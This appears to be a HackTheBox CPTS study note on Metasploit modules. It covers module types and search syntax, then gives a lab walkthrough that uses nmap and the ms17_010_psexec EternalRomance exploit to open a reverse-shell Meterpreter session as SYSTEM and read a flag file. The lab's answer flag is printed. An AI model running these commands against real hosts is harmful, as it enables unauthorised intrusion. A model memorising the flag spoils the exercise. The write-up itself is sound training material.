### CPTS / HTB Penetration Tester Path <br>
### Metasploit Framework - Modules <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Modules



Module path syntax: `<No.> <type>/<os>/<service>/<name>` — e.g. `exploit/windows/smb/ms17_010_psexec`.

Module types:

| Type | Description |
|---|---|
| `Auxiliary` | Scanning, fuzzing, sniffing, admin — interactable |
| `Encoders` | Make payloads compatible / strip bad chars |
| `Exploits` | Trigger a vuln to deliver a payload — interactable |
| `NOPs` | Keep payload size consistent |
| `Payloads` | Code that runs on target post-exploit |
| `Plugins` | Extra integrations loaded into msfconsole |
| `Post` | Post-exploitation modules — interactable |

Only `Auxiliary`, `Exploits`, and `Post` can be called via `use <no.>`.

Search syntax — use keywords (`cve`, `type`, `platform`, `rank`, `name`, etc.):

```diff
+ msf6 > search eternalromance
+ msf6 > search eternalromance type:exploit
+ msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
+ msf6 > search ms17_010
```

Select & inspect a module:

```diff
+ msf6 > use 0
+ msf6 exploit(...) > info
+ msf6 exploit(...) > options
```

Set targets — `set` is per-module, `setg` is global until restart:

```diff
+ msf6 exploit(...) > set RHOSTS 10.10.10.40
+ msf6 exploit(...) > setg RHOSTS 10.10.10.40
+ msf6 exploit(...) > setg LHOST 10.10.14.15
```

Run it:

```diff
+ msf6 exploit(...) > run
```

<br>

---

<br>

### Modules Exercise

IP: 10.129.216.38

---

### Question 1:
Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.

```diff
+ $ sudo nmap -sT -sC -sV -A -F 10.129.216.38
```

	PORT    STATE SERVICE      VERSION
	80/tcp  open  http         Microsoft IIS httpd 10.0
	135/tcp open  msrpc        Microsoft Windows RPC
	139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds

#### SMB is vulnerable. Search for the EternalRomance module:

```diff
+ msf6 > search EternalRomance
+ msf6 > use 0
+ msf6 exploit(windows/smb/ms17_010_psexec) > set rhost 10.129.216.38
+ msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 10.10.15.149
+ msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

	[*] Started reverse TCP handler on 10.10.15.149:4444 
	[*] 10.129.216.38:445 - Target OS: Windows Server 2016 Standard 14393
	[+] 10.129.216.38:445 - Overwrite complete... SYSTEM session obtained!
	[*] Meterpreter session 1 opened (10.10.15.149:4444 -> 10.129.216.38:49672)

#### Navigate to admin desktop and read the flag:

```diff
+ (Meterpreter 1)(C:\) > cd Users\Administrator\Desktop
+ (Meterpreter 1)(C:\Users\Administrator\Desktop) > shell
+ C:\Users\Administrator\Desktop> type flag.txt
```

	HTB{MSF-W1nD0w5-3xPL01t4t10n}

&#x1F6A9; found **HTB{MSF-W1n--edit--w5-3xPL01t4t10n}**.
